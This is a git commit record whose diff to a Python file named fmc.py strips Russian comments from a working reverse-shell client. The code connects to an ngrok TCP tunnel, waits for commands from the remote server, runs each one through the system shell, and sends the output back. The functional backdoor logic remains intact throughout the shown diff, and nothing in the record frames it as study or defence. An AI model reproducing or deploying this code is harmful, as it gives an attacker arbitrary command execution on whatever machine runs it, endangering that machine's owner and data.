2dc1ee771700632d44e9d9c185d376650c4e46b6
DTiming24 <125190074+DTiming24@users.noreply.github.com>
2025-01-19 11:28:05 +0200

    Update fmc.py

--- fmc.py
+++ fmc.py
@@ -6,19 +6,17 @@ def start_client():
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     while True:
         try:
-            client_socket.connect(('5.tcp.ngrok.io', 20545))  # Укажите адрес сервера
+            client_socket.connect(('5.tcp.ngrok.io', 20545))
         finally:
             break
     print("Connected to server. Waiting for commands...")
 
     while True:
-        # Получаем команду от сервера
         command = client_socket.recv(1024).decode()
         
         if command.lower() == "exit":
             break
 
-        # Выполняем команду на клиенте
         try:
             result = subprocess.run(command, shell=True, capture_output=True, text=True)
             if result.returncode == 0:
@@ -28,7 +26,6 @@ def start_client():
         except Exception as e:
             response = f"Error executing command: {e}"
 
-        # Отправляем результат выполнения команды обратно на сервер
         client_socket.send(response.encode())
 
     client_socket.close()
